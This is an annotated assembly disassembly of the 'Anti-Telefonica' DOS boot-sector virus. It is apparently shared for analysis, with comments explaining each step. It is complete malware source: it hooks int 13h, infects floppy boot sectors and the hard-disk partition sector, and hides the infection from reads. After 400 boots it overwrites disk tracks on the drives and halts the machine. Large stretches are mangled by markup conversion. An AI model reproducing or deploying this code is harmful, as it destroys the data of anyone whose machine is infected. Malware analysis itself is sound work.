

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

;<----- initial="" part="" of="" virus="" boot="" sector="" executed="" with="" cs="0," ip="7C00h" start:="" jmp="" short="" l_001e="" ;.0000="" eb="" 1c="" nop="" ;.0002="" 90="" d_0003="" db="" 'msdos3.3'="" ;.0003="" 4d="" 53="" 44="" 4f="" 53="" 33="" 2e="" 33="" dw="" 0200h="" ;.000b="" 00="" 02="" db="" 02h="" ;.000d="" 02="" dw="" 0001h="" ;.000e="" 01="" 00="" db="" 02h="" ;.0010="" 02="" dw="" 0070h="" ;.0011="" 70="" 00="" dw="" 02d0h="" ;.0013="" d0="" 02="" db="" 0fdh="" ;.0015="" fd="" dw="" 0002h="" ;.0016="" 02="" 00="" dw="" 0009h="" ;.0018="" 09="" 00="" dw="" 0002h="" ;.001a="" 02="" 00="" dw="" 0000h="" ;.001c="" 00="" 00="" l_001e:="" mov="" bx,7c00h="" ;establish="" stack="" ;.001e="" bb="" 7c00="" xor="" ax,ax="" ;.0021="" 33="" c0="" cli="" ;.0023="" fa="" mov="" ss,ax="" ;.0024="" 8e="" d0="" mov="" sp,bx="" ;.0026="" 8b="" e3="" sti="" ;.0028="" fb="" mov="" ds,ax="" ;.0029="" 8e="" d8="" mov="" ax,ds:[413h]="" ;bios="" memory="" size="" ;.002b="" a1="" 0413="" dec="" ax="" ;-="" 1kb="" ;.002e="" 48="" mov="" ds:[413h],ax="" ;.002f="" a3="" 0413="" mov="" cl,6="" ;kb="" -=""> paragraphs		;.0032  B1 06
	shl	ax,cl						;.0034  D3 E0
	mov	es,ax		;resident virus segment		;.0036  8E C0
	mov	cx,200h		;virus code length		;.0038  B9 0200
	push	cs						;.003B  0E
	pop	ds						;.003C  1F
	mov	si,bx						;.003D  8B F3
	xor	di,di						;.003F  33 FF
	cld							;.0041  FC
	rep	movsb		;copy virus code		;.0042  F3/ A4
	push	es						;.0044  06
	mov	bx,offset L00EE					;.0045  BB 00EE
	push	bx						;.0048  53
	retf			;jump into resident virus	;.0049  CB

	;=======================================================
	;	coded text:
	;	'Campa¤a ANTI-TELEFONICA (Barcelona)',cr,lf
	;-------------------------------------------------------
	;<-- contamination="" pointer="" (word)="" d_004a="" db="" 0bch,9eh,92h="" ;.004a="" bc="" 9e="" 92="" ;="" 43="" 61="" 6d="" db="" 8fh,="" 9eh,="" 5bh,="" 9eh,0dfh,0beh="" ;.004d="" 8f="" 9e="" 5b="" 9e="" df="" be="" ;="" 70="" 61="" a4="" 61="" 20="" 41="" db="" 91h,="" 8bh,="" 96h,0d2h,0abh,0bah="" ;.0053="" 91="" 8b="" 96="" d2="" ab="" ba="" ;="" 6e="" 74="" 69="" 2d="" 54="" 45="" db="" 0b3h,0bah,0b9h,0b0h,0b1h,0b6h="" ;.0059="" b3="" ba="" b9="" b0="" b1="" b6="" ;="" 4c="" 45="" 46="" 4f="" 4e="" 49="" db="" 0bch,0beh,0dfh,0d7h,0bdh,="" 9eh="" ;.005f="" bc="" be="" df="" d7="" bd="" 9e="" ;="" 43="" 41="" 20="" 28="" 42="" 61="" db="" 8dh,="" 9ch,="" 9ah,="" 93h,="" 90h,="" 91h="" ;.0065="" 8d="" 9c="" 9a="" 93="" 90="" 91="" ;="" 72="" 63="" 65="" 6c="" 6f="" 6e="" db="" 9eh,0d6h,0f2h,0f5h,0ffh="" ;.006b="" 9e="" d6="" f2="" f5="" ff="" ;="" 61="" 29="" 0d="" 0a="" ;="======================================================" ;="" virus="" second="" part="" parameters="" table:="" ;="" dw=""></--><sector count="">
	;	db	<sector nr="">
	;	db	<head nr="">
	;-------------------------------------------------------
d_0070	db	40h,01h,06h,00h		;320			;.0070  40 01 06 00 
	db	68h,01h,08h,00h		;360			;.0074  68 01 08 00
	db	80h,02h,01h,01h		;640			;.0078  80 02 01 01
	db	0D0h,02h,02h,01h	;720			;.007C  D0 02 02 01
	db	60h,09h,0Dh,01h		;2400			;.0080  60 09 0D 01
	db	0A0h,05h,04h,01h	;1440			;.0084  A0 05 04 01
	db	40h,0Bh,0Eh,01h		;2880			;.0088  40 0B 0E 01
	db	0FFh,0FFh,06h,00h	;HDD			;.008C  FF FF 06 00

	db	0F4h,02h,02h,01h	;?not used		;0090  F4 02 02 01


;===============================================================
;	write 1 sector
;---------------------------------------------------------------
s_0094	proc	near
	mov	ax,301h		;write 1 sector			;.0094  B8 0301
	int	13h						;.0097  CD 13
	retn							;.0099  C3
s_0094	endp


;===============================================================
;	read sector into memory
;---------------------------------------------------------------
s_009A	proc	near
	mov	bp,4		;retry counter			;.009A  BD 0004
l_009D:	mov	ax,201h		;read 1 sector			;.009D  B8 0201
	int	13h						;.00A0  CD 13
	jnc	l_00AB		;-> O.K.			;.00A2  73 07
	xor	ah,ah		;reset disk			;.00A4  32 E4
	int	13h						;.00A6  CD 13
	dec	bp		;retry counter			;.00A8  4D
	jnz	l_009D						;.00A9  75 F2

l_00AB:	retn							;.00AB  C3
s_009A	endp

;===============================================================
;	execute oryginal int 13h
;---------------------------------------------------------------
s_00AC:	pushf							;.00AC  9C
	db	9Ah,3Dh,0A3h,00h,0F0h				;.00AD  9A 3D A3 00 F0
	;call	far ptr F000:A33D
d_00AE	equ	$-4			;oryginal int 13h offset
d_00B0	equ	$-2			;		  segment
	retn							;.00B2  C3

;===============================================================
;	get second virus part sector/head
;---------------------------------------------------------------
s_00B3	proc	near
	mov	cl,[d_00EC]		;index into d_0070	;.00B3  8A 0E 00EC
	mov	si,offset d_0070				;.00B7 .BE 0070
	add	si,cx						;.00BA  03 F1
	mov	cl,byte ptr ds:[si+2]	;sector nr		;.00BC  8A 4C 02
	mov	dh,byte ptr ds:[si+3]	;head			;.00BF  8A 74 03
	retn							;.00C2  C3
s_00B3	endp


;===============================================================
;	Write track
;---------------------------------------------------------------
s_00C3	proc	near
	mov	al,[d_00E9]	;max sector nr			;.00C3  A0 00E9
	mov	ah,3		;write sectors			;.00C6  B4 03
	int	13h						;.00C8  CD 13
	inc	dh		;next head			;.00CA  FE C6
	retn							;.00CC  C3
s_00C3	endp

;===============================================================
;	recalculate track nr -> BIOS track
;---------------------------------------------------------------
s_00CD:	push	dx						;.00CD  52
	mov	dx,cx						;.00CE  8B D1
	xchg	dh,dl						;.00D0  86 F2
	mov	cl,6		;hi order track nr		;.00D2  B1 06
	shl	dl,cl						;.00D4  D2 E2
	or	dl,1		;1 sector			;.00D6  80 CA 01
	mov	cx,dx						;.00D9  8B CA
	pop	dx						;.00DB  5A
	retn							;.00DC  C3

;================================================================
;	Write cylinder
;----------------------------------------------------------------
s_00DD:	call	s_00C3		;Write track			;.00DD  E8 FFE3
	cmp	dh,[d_00EA]	;boot drive heads		;.00E0  3A 36 00EA
	jne	s_00DD						;.00E4  75 F7
	retn							;.00E6  C3

d_00E7	dw	40		;boot drive track count		;.00E7  28 00
d_00E9	db	9		;boot drive sectors per track	;.00E9  09
d_00EA	db	2		;boot drive head nr		;.00EA  02
d_00EB	db	2		;destructed drives count	;.00EB  02
d_00EC	db	12		;index into table d_0070	;.00EC  0C
D_00ED	db	0		;boot drive (00/80)		;.00ED  00

	;<----- executed="" in="" residence="" place,="" ip="00EEh" l00ee:="" mov="" ds,ax="" ;ax="virus" segment="" ;.00ee="" 8e="" d8="" xor="" ah,ah="" ;reset="" disk="" system="" ;.00f0="" 32="" e4="" int="" 13h="" ;.00f2="" cd="" 13="" mov="" bx,200h="" ;disk="" buffer="" ;.00f4="" .bb="" 0200="" mov="" ch,bl="" ;ch="" :="0" ;.00f7="" 8a="" eb="" mov="" dl,[d_00ed]="" ;dl="boot" drive="" ;.00f9="" 8a="" 16="" 00ed="" call="" s_00b3="" ;get="" virus="" area="" sector/head="" ;.00fd="" e8="" ffb3="" call="" s_009a="" ;read="" sector="" into="" memory="" ;.0100="" e8="" ff97="" inc="" word="" ptr="" [d_02ec]="" ;boot="" count="" ;.0103="" ff="" 06="" 02ec="" cmp="" word="" ptr="" [d_02ec],190h="" ;trigger="400" ;.0107="" 81="" 3e="" 02ec="" 0190="" jbe="" l_0112="" ;-=""> not yet			;.010D  76 03
	jmp	l_0221		;-> DESTRUCTION			;.010F  E9 010F

l_0112:	call	s_0094		;write back sector with counter	;.0112  E8 FF7F
	xor	ax,ax						;.0115  33 C0
	mov	[d_02EC],ax	;boot counter			;.0117  A3 02EC
	mov	es,ax						;.011A  8E C0
	mov	bx,7C00h	;disk buffer			;.011C  BB 7C00
	inc	cl		;oryginal boot/partition	;.011F  FE C1
	call	s_009A		;read sector into memory	;.0121  E8 FF76
	cmp	dl,80h		;HDD ?				;.0124  80 FA 80
	jne	l_012C		;-> FDD				;.0127  75 03
	jmp	l_01AD		;-> HDD				;.0129  E9 0081

	;<----- fdd,="" infect="" hdd="" l_012c:="" mov="" bx,cs="" ;establish="" disk="" buffer="" ;.012c="" 8c="" cb="" sub="" bx,1000h="" ;.012e="" 81="" eb="" 1000="" mov="" es,bx="" ;.0132="" 8e="" c3="" xor="" bx,bx="" ;.0134="" 33="" db="" mov="" cl,1="" ;track="" 0,="" sector="" 1="" ;.0136="" b1="" 01="" mov="" dx,80h="" ;head="" 0,="" hdd="" 0="" ;.0138="" ba="" 0080="" call="" s_009a="" ;read="" sector="" into="" memory="" ;.013b="" e8="" ff5c="" jc="" l_01ad="" ;-=""> error, pass	HDD		;.013E  72 6D
	cmp	word ptr es:[bx+04Ah],9EBCh			;.0140  26: 81 BF 004A 9EBC
	je	l_01AD		;-> allready infected		;.0147  74 64
	push	cx						;.0149  51
	push	dx						;.014A  52
	mov	ah,8		;Read parameters for drive dl	;.014B  B4 08
	int	13h						;.014D  CD 13
	jc	l_0171		;-> error			;.014F  72 20
	inc	dh		;heads + 1			;.0151  FE C6
	mov	[d_00EA],dh	;boot drive heads		;.0153  88 36 00EA
	mov	dl,cl						;.0157  8A D1
	xchg	ch,cl						;.0159  86 E9
	and	ch,3Fh		;sector				;.015B  80 E5 3F
	mov	[d_00E9],ch	;max sector nr			;.015E  88 2E 00E9
	push	cx						;.0162  51
	mov	cl,6						;.0163  B1 06
	shr	dl,cl						;.0165  D2 EA
	pop	cx						;.0167  59
	mov	ch,dl						;.0168  8A EA
	inc	cx						;.016A  41
	mov	[d_00E7],cx	;max drive track		;.016B  89 0E 00E7
	jmp	short l_0181					;.016F  EB 10

	;<----- hdd="" error="" l_0171:="" mov="" [d_00ea],4="" ;boot="" drive="" heads="" ;.0171="" c6="" 06="" 00ea="" 04="" mov="" [d_00e9],17="" ;max="" sector="" nr="" ;.0176="" c6="" 06="" 00e9="" 11="" mov="" [d_00e7],263h="" ;max="" drive="" track="611" ;.017b="" c7="" 06="" 00e7="" 0263="" l_0181:="" pop="" dx="" ;.0181="" 5a="" pop="" cx="" ;.0182="" 59="" mov="" [d_00ec],1ch="" ;index="" into="" d_0070="" ;.0183="" c6="" 06="" 00ec="" 1c="" mov="" [d_00ed],dl="" ;boot="" drive="" (00/80)="" ;.0188="" 88="" 16="" 00ed="" mov="" cl,7="" ;.018c="" b1="" 07="" call="" s_0094="" ;write="" 1="" sector="" (oryginal="" boot)="" ;.018e="" e8="" ff03=""></-----><----- copy="" partition="" table="" push="" es="" ;.0191="" 06="" pop="" ds="" ;.0192="" 1f="" push="" cs="" ;.0193="" 0e="" pop="" es="" ;.0194="" 07="" mov="" cx,42h="" ;table="" length+boot="" sign="" ;.0195="" b9="" 0042="" mov="" si,offset="" d_01be="" ;.0198="" .be="" 01be="" mov="" di,si="" ;.019b="" 8b="" fe="" cld="" ;.019d="" fc="" rep="" movsb="" ;.019e="" f3/="" a4="" inc="" cl="" ;.01a0="" fe="" c1="" call="" s_0094="" ;write="" 1="" sector="" ;.01a2="" e8="" feef="" mov="" bx,200h="" ;second="" virus="" part="" ;.01a5="" bb="" 0200="" mov="" cl,6="" ;.01a8="" b1="" 06="" call="" s_0094="" ;write="" 1="" sector="" ;.01aa="" e8="" fee7="" l_01ad:="" jmp="" short="" l_0200="" ;.01ad="" eb="" 51="" d_01af="" db="" 1="" ;contamined="" drive="" ;.01af="" 01="" l_01b0:="" pop="" ds="" ;.01b0="" 1f="" pop="" si="" ;.01b1="" 5e="" jmp="" dword="" ptr="" cs:[d_00ae]="" ;oryginal="" int="" 13h="" ;.01b2="" 2e:="" ff="" 2e="" 00ae="" l_01b7:="" push="" ax="" ;cs:="0" ;.01b7="" 50="" mov="" bx,7c00h="" ;ip="" for="" real="" boot="" sector="" ;.01b8="" bb="" 7c00="" push="" bx="" ;.01bb="" 53="" retf="" ;.01bc="" cb="" db="" 0adh="" ;?="" not="" used="" ;01bd="" ad=""></-----><----- partition="" table="" from="" oryginal="" sector="" d_01be="" label="" byte="" db="" 080h,001h,001h,000h,004h,005h,051h,093h="" ;01be="" 80="" 01="" 01="" 00="" 04="" 05="" 51="" 93="" db="" 011h,000h,000h,000h,0e7h,0a0h,000h,000h="" ;01c6="" 11="" 00="" 00="" 00="" e7="" a0="" 00="" 00="" db="" 000h,000h,041h,094h,005h,005h,0d1h,027h="" ;01ce="" 00="" 00="" 41="" 94="" 05="" 05="" d1="" 27="" db="" 0f8h,0a0h,000h,000h,0f8h,0a0h,000h,000h="" ;01d6="" f8="" a0="" 00="" 00="" f8="" a0="" 00="" 00="" db="" 20h="" dup="" (0)="" ;01de="" 0020[00]="" db="" 55h,0aah="" ;01fe="" 55="" aa="" ;---------------------------------------------------------------="" ;="==============================================================" ;="" second="" virus="" part="" ;---------------------------------------------------------------="" l_0200:="" xor="" ax,ax="" ;.0200="" 33="" c0="" mov="" cs:[d_00ed],al="" ;boot="" drive="" (00/80)="" ;.0202="" 2e:="" a2="" 00ed="" mov="" ds,ax="" ;.0206="" 8e="" d8="" mov="" bx,offset="" l_029f="" ;.0208="" .bb="" 029f="" mov="" dx,cs="" ;.020b="" 8c="" ca="" xchg="" bx,ds:[4ch]="" ;int="" 13h="" ;.020d="" 87="" 1e="" 004c="" xchg="" dx,ds:[4ch+2]="" ;.0211="" 87="" 16="" 004e="" push="" cs="" ;.0215="" 0e="" pop="" ds="" ;.0216="" 1f="" xchg="" bx,word="" ptr="" [d_00ae]="" ;oryginal="" int="" 13h="" offs="" ;.0217="" 87="" 1e="" 00ae="" xchg="" dx,word="" ptr="" [d_00b0]="" ;="" seg="" ;.021b="" 87="" 16="" 00b0="" jmp="" short="" l_01b7="" ;.021f="" eb="" 96="" ;="===============================================================" ;="" destruction="" !!!!="" ;----------------------------------------------------------------="" l_0221:="" xor="" ax,ax="" ;.0221="" 33="" c0="" mov="" [d_02ec],ax="" ;boot="" counter="" ;.0223="" a3="" 02ec="" call="" s_0094="" ;write="" back="" viru="" sector="" ;.0226="" e8="" fe6b="" push="" cs="" ;.0229="" 0e="" pop="" ds="" ;.022a="" 1f="" mov="" dl,[d_00ed]="" ;boot="" drive="" (00/80)="" ;.022b="" 8a="" 16="" 00ed=""></-----><----- one="" drive="" loop="" begin="" l_022f:="" xor="" ax,ax="" ;.022f="" 33="" c0="" mov="" es,ax="" ;.0231="" 8e="" c0="" mov="" bx,ax="" ;disk="" buffer="0000:0000" ;.0233="" 8b="" d8=""></-----><----- last="" cylinder="" -="" all="" heads="" mov="" cx,[d_00e7]="" ;boot="" drive="" track="" count="" ;.0235="" 8b="" 0e="" 00e7="" dec="" cx="" ;beginning="" from="" 0="" ;.0239="" 49="" call="" s_00cd="" ;track="" nr="" -=""> BIOS track		;.023A  E8 FE90
	xor	dh,dh		;head begin nr := 0		;.023D  32 F6
	call	s_00DD		;Write cylinder			;.023F  E8 FE9B

	;<----- first="" cylinder="" -="" head="" 1="" ...="" mov="" cx,1="" ;.0242="" b9="" 0001="" mov="" dh,cl="" ;beginning="" from="" head="" 1="" ;.0245="" 8a="" f1="" call="" s_00dd="" ;write="" cylinder="" ;.0247="" e8="" fe93=""></-----><- cx="1" l_024a:="" push="" cx="" ;.024a="" 51="" call="" s_00cd="" ;track="" nr="" -=""> BIOS track		;.024B  E8 FE7F
	xor	dh,dh		;beginning from head 0		;.024E  32 F6
	call	s_00DD		;Write cylinder			;.0250  E8 FE8A
	pop	cx						;.0253  59
	inc	cl		;next cylinder			;.0254  FE C1
	cmp	cl,6						;.0256  80 F9 06
	jne	l_024A		;-> destroy next		;.0259  75 EF

	;<----- from="" 6-th="" track="" destroy="" only="" one="" track="" per="" cylinder="" mov="" cl,[d_00ea]="" ;boot="" drive="" heads="" ;.025b="" 8a="" 0e="" 00ea="" mov="" di,cx="" ;.025f="" 8b="" f9="" l_0261:="" mov="" cx,6="" ;track="" 6="" ;.0261="" b9="" 0006="" mov="" dh,bl="" ;:="0" ;.0264="" 8a="" f3="" l_0266:="" push="" cx="" ;.0266="" 51="" call="" s_00cd="" ;track="" nr="" -=""> BIOS track		;.0267  E8 FE63
	call	s_00C3		;Write track			;.026A  E8 FE56
	cmp	dh,[d_00EA]	;boot drive heads		;.026D  3A 36 00EA
	jne	l_0275		;-> not all heads yet		;.0271  75 02
	xor	dh,dh		;return to head 0		;.0273  32 F6
l_0275:	pop	cx		;track nr			;.0275  59
	inc	cx		;next track			;.0276  41
	cmp	cx,[d_00E7]	;drive track count		;.0277  3B 0E 00E7
	jne	l_0266		;-> next is waiting for virus	;.027B  75 E9

	;<---- all="" tracks="" are="" ready="" inc="" bl="" ;:="1" ;.027d="" fe="" c3="" mov="" si,offset="" d_004a="" ;coded="" text="" adress="" ;.027f="" .be="" 004a="" cld="" ;.0282="" fc="" l_0283:="" lodsb="" ;.0283="" ac="" not="" al="" ;.0284="" f6="" d0="" or="" al,al="" ;.0286="" 0a="" c0="" jz="" l_0292="" ;-=""> End of string		;.0288  74 08
	mov	ah,0Eh		; writechar as TTY		;.028A  B4 0E
	xor	bh,bh						;.028C  32 FF
	int	10h						;.028E  CD 10
	jmp	short l_0283					;.0290  EB F1

l_0292:	dec	di		;boot drive heads		;.0292  4F
	jnz	l_0261		;-> destroy next part of disk	;.0293  75 CC

	inc	dl		;next drive			;.0295  FE C2
	dec	[d_00EB]	;destructed drives count	;.0297  FE 0E 00EB
	jnz	l_022F		;-> not all yet			;.029B  75 92
	cli							;.029D  FA
	hlt			;lock computer			;.029E  F4


;===============================================================
;	virus int 13h service routine
;---------------------------------------------------------------
l_029F:	push	si						;.029F  56
	push	ds						;.02A0  1E
	cmp	dl,80h			;HDD ?			;.02A1  80 FA 80
	jne	l_02A9			;-> no			;.02A4  75 03
	jmp	l_03BB			;yes, exit		;.02A6  E9 0112

	;<----- fdd="" l_02a9:="" cmp="" ah,2="" ;read="" ;.02a9="" 80="" fc="" 02="" jb="" l_02e9="" ;-=""> no, pass		;.02AC  72 3B
	cmp	ah,3			;write ?		;.02AE  80 FC 03
	ja	l_02E9			;-> no, pass		;.02B1  77 36
	cmp	dl,2			;B: ?			;.02B3  80 FA 02
	jae	l_02E9			;-> yes, pass		;.02B6  73 31
	xor	si,si						;.02B8  33 F6
	mov	ds,si						;.02BA  8E DE
	test	byte ptr ds:[43Fh],3	;diskette A:/B: motor on;.02BC  F6 06 043F 03
	jnz	l_02E9			;-> yes, pass		;.02C1  75 26
	push	ax						;.02C3  50
	push	cx						;.02C4  51
	push	dx						;.02C5  52
	push	cs						;.02C6  0E
	pop	ds						;.02C7  1F
	mov	[d_01AF],dl		;save drive nr		;.02C8  88 16 01AF
	push	bp						;.02CC  55
	mov	bp,4		;retry count			;.02CD  BD 0004
l_02D0:	mov	ax,201h		;read 1 sector			;.02D0  B8 0201
	xor	dh,dh		;head := 0			;.02D3  32 F6
	mov	cx,1		;track = 0, sector = 1		;.02D5  B9 0001
	call	s_00AC		;execute oryginal int 13h	;.02D8  E8 FDD1
	jnc	l_02EE		;-> no error			;.02DB  73 11
	xor	ax,ax		;reset drive			;.02DD  33 C0
	call	s_00AC		;execute oryginal int 13h	;.02DF  E8 FDCA
	dec	bp						;.02E2  4D
	jnz	l_02D0		;-> once more			;.02E3  75 EB
	pop	bp		;<- unrecoverable="" disk="" error="" ;.02e5="" 5d="" pop="" dx="" ;.02e6="" 5a="" pop="" cx="" ;.02e7="" 59="" pop="" ax="" ;.02e8="" 58="" l_02e9:="" jmp="" l_01b0="" ;jump="" into="" oryginal="" int="" 13h="" ;.02e9="" e9="" fec4="" d_02ec="" dw="" 0="" ;boot="" counter="" ;.02ec="" 0000="" l_02ee:="" pop="" bp="" ;.02ee="" 5d="" cmp="" es:[d_004a],9ebch="" ;contamination="" ptr="" ;.02ef="" 26:="" 81="" bf="" 004a="" 9ebc="" jne="" l_02fb="" ;-=""> not contamined yet		;.02F6  75 03
	jmp	l_039C		;-> allready contamined		;.02F8  E9 00A1

	;<----- contamination="" l_02fb:="" mov="" ax,es:[bx+13h]="" ;max="" disk="" sector="" number="" ;.02fb="" 26:="" 8b="" 87="" 0013="" mov="" si,offset="" d_0070="" ;.0300="" .be="" 0070="" l_0303:="" cmp="" [si],ax="" ;find="" format="" in="" the="" table="" ;.0303="" 39="" 04="" je="" l_030c="" ;.0305="" 74="" 05="" add="" si,4="" ;.0307="" 83="" c6="" 04="" jmp="" short="" l_0303="" ;.030a="" eb="" f7="" l_030c:="" push="" bx=""></-----><- buffer="" address="" ;.030c="" 53="" mov="" bx,si="" ;format="" descriptor="" address="" ;.030d="" 8b="" de="" mov="" dx,offset="" d_0070="" ;.030f="" ba="" 0070="" sub="" bx,dx="" ;.0312="" 2b="" da="" mov="" dl,bl="" ;.0314="" 8a="" d3="" pop="" bx="" ;.0316="" 5b="" mov="" [d_00ec],dl="" ;index="" into="" d_0070="" ;.0317="" 88="" 16="" 00ec="" mov="" cl,[si+2]="" ;sector="" number="" for="" this="" format="" ;.031b="" 8a="" 4c="" 02="" inc="" cl="" ;next="oryginal" boot="" sec="" place="" ;.031e="" fe="" c1="" mov="" dh,[si+3]="" ;head="" number="" for="" this="" format="" ;.0320="" 8a="" 74="" 03="" mov="" dl,[d_01af]="" ;drive="" nr="" ;.0323="" 8a="" 16="" 01af="" mov="" ax,301h="" ;write="" sector="" ;.0327="" b8="" 0301="" call="" s_00ac="" ;execute="" oryginal="" int="" 13h="" ;.032a="" e8="" fd7f="" push="" cx="" ;.032d="" 51="" mov="" ax,es:[bx+18h]="" ;max="" sector="" nr="" from="" param.table="" ;.032e="" 26:="" 8b="" 87="" 0018="" mov="" [d_00e9],al="" ;max="" sector="" nr="" to="" destruct="" ;.0333="" a2="" 00e9="" mov="" ch,al="" ;.0336="" 8a="" e8="" mov="" ax,es:[bx+1ah]="" ;head="" nr="" from="" param.="" table="" ;.0338="" 26:="" 8b="" 87="" 001a="" mov="" [d_00ea],al="" ;boot="" drive="" heads="" ;.033d="" a2="" 00ea="" mov="" cl,al="" ;.0340="" 8a="" c8="" mov="" ax,es:[bx+13h]="" ;last="" disk="" sector="" number="" ;.0342="" 26:="" 8b="" 87="" 0013="" div="" ch="" ;/="" sectors="" on="" track="" ;.0347="" f6="" f5="" xor="" ah,ah="" ;.0349="" 32="" e4="" div="" cl="" ;/="" heads="" number="" ;.034b="" f6="" f1="" xor="" ah,ah="" ;.034d="" 32="" e4="" mov="" [d_00e7],ax="" ;max="" track="" number="" to="" destruct="" ;.034f="" a3="" 00e7="" pop="" cx="" ;.0352="" 59="" push="" es="" ;.0353="" 06="" push="" bx="" ;.0354="" 53="" push="" cx="" ;.0355="" 51="" push="" dx="" ;.0356="" 52="" mov="" cx,1bh="" ;parameter="" table="" length="" ;.0357="" b9="" 001b="" mov="" si,offset="" d_0003="" ;="" address="" ;.035a="" .be="" 0003="" l_035d:="" mov="" al,es:[bx+3]=""></-><- copy="" diskette="" param.="" table="" ;.035d="" 26:="" 8a="" 47="" 03="" mov="" [si],al="" ;.0361="" 88="" 04="" inc="" bx="" ;.0363="" 43="" inc="" si="" ;.0364="" 46="" loop="" l_035d="" ;.0365="" e2="" f6="" push="" cs="" ;.0367="" 0e="" pop="" es="" ;.0368="" 07="" xor="" bx,bx="" ;buffer="first" virus="" sector="" ;.0369="" 33="" db="" mov="" cx,1="" ;track="0," sector="1" ;.036b="" b9="" 0001="" xor="" dh,dh="" ;head="0" ;.036e="" 32="" f6="" mov="" ax,301h="" ;write="" 1="" sector="" ;.0370="" b8="" 0301="" call="" s_00ac="" ;execute="" oryginal="" int="" 13h="" ;.0373="" e8="" fd36="" pop="" dx="" ;.0376="" 5a="" pop="" cx="" ;.0377="" 59="" mov="" bx,200h="" ;disk="" buffer="2nd" virus="" part="" ;.0378="" bb="" 0200="" dec="" cl="" ;1="" sector="" back="" ;.037b="" fe="" c9="" mov="" ax,301h="" ;write="" 1="" sector="" ;.037d="" b8="" 0301="" call="" s_00ac="" ;execute="" oryginal="" int="" 13h="" ;.0380="" e8="" fd29="" pop="" bx="" ;.0383="" 5b="" pop="" es="" ;.0384="" 07="" pop="" dx="" ;.0385="" 5a="" pop="" cx="" ;.0386="" 59="" pop="" ax="" ;.0387="" 58="" cmp="" ax,201h="" ;read="" ;.0388="" 3d="" 0201="" jne="" l_03fc="" ;-=""> no				;.038B  75 6F
	cmp	cx,1		;track 0 / sector 1		;.038D  83 F9 01
	jne	l_03FC						;.0390  75 6A
	or	dh,dh		;head				;.0392  0A F6
	jnz	l_03FC						;.0394  75 66

	;<----- sector="" allready="" in="" buffer="" mov="" ax,1="" ;.0396="" b8="" 0001="" clc="" ;.0399="" f8="" jmp="" short="" l_03f7="" ;.039a="" eb="" 5b=""></-----><----- disk="" contamined="" l_039c:="" pop="" dx="" ;.039c="" 5a="" pop="" cx="" ;.039d="" 59="" pop="" ax="" ;.039e="" 58="" cmp="" ax,201h="" ;read="" 1="" sector="" ;.039f="" 3d="" 0201="" jne="" l_03fc="" ;-=""> no, oryginal int 13h	;.03A2  75 58
	cmp	cx,1		;track 0, sector 1		;.03A4  83 F9 01
	jne	l_03FC		;-> no, oryginal int 13h	;.03A7  75 53
	or	dh,dh		;head = 0 ?			;.03A9  0A F6
	jnz	l_03FC		;-> no, oryginal int 13h	;.03AB  75 4F
	push	cx						;.03AD  51
	push	dx						;.03AE  52
	mov	cl,es:[0ECh+bx]	;index into table d_0070	;.03AF  26: 8A 8F 00EC
	call	s_00B7		;get second virus part address	;.03B4  E8 FD00
	inc	cl		;next sector			;.03B7  FE C1
	jmp	short l_03F2	;-> read sector			;.03B9  EB 37

	;<----- hdd="" int="" 13h="" service="" l_03bb:="" cmp="" ah,2="" ;read="" ;.03bb="" 80="" fc="" 02="" je="" l_03d1="" ;-=""> yes				;.03BE  74 11
	cmp	ah,3		;write ?			;.03C0  80 FC 03
	jne	l_03FC		;-> no				;.03C3  75 37

	;<----- write="" or="" ch,ch="" ;track="0" ;.03c5="" 0a="" ed="" jnz="" l_03fc="" ;-=""> no				;.03C7  75 33
				;<- track="" 0/256/512/768="" or="" dh,dh="" ;head="0" ;.03c9="" 0a="" f6="" jnz="" l_03fc="" ;-=""> no				;.03CB  75 2F
	inc	ah		;change write to verify		;.03CD  FE C4
	jmp	short l_03FC					;.03CF  EB 2B

	;<----- read="" l_03d1:="" cmp="" al,1="" ;sector="" count="" ;.03d1="" 3c="" 01="" jne="" l_03fc="" ;-=""> multi sector		;.03D3  75 27
	or	dh,dh		;head=0 ?			;.03D5  0A F6
	jnz	l_03FC		;-> no				;.03D7  75 23
	cmp	cx,1		;track 0, sector 1		;.03D9  83 F9 01
	je	l_03EE		;boot				;.03DC  74 10
	cmp	cx,6						;.03DE  83 F9 06
	je	l_03E8		;-> second virus part		;.03E1  74 05
	cmp	cx,7						;.03E3  83 F9 07
	jne	l_03FC		;jump into oryginal int 13h	;.03E6  75 14

	;<----- saved="" oryginal="" boot/virus="" second="" part="" l_03e8:="" push="" cx="" ;.03e8="" 51="" push="" dx="" ;.03e9="" 52="" mov="" cl,5="" ;last="" directory="" sector="" ;.03ea="" b1="" 05="" jmp="" short="" l_03f2="" ;.03ec="" eb="" 04=""></-----><----- virus="" boot="" l_03ee:="" push="" cx="" ;.03ee="" 51="" push="" dx="" ;.03ef="" 52="" mov="" cl,7="" ;saved="" boot="" position="" ;.03f0="" b1="" 07="" l_03f2:="" call="" s_00ac="" ;execute="" oryginal="" int="" 13h="" ;.03f2="" e8="" fcb7="" pop="" dx="" ;.03f5="" 5a="" pop="" cx="" ;.03f6="" 59="" l_03f7:="" pop="" ds="" ;.03f7="" 1f="" pop="" si="" ;.03f8="" 5e="" retf="" 2="" ;exit,="" leave="" flags="" ;.03f9="" ca="" 0002="" l_03fc:="" jmp="" l_01b0="" ;-=""> jump into oryginal int 13h	;.03FC  E9 FDB1

	db	0DAh		;? not used			;03FF  DA


seg_a	ends



	end	start

</-----></-----></-></-----></-----></-----></-></-></-----></----></-----></-></-----></-----></-----></head></sector></sector></----->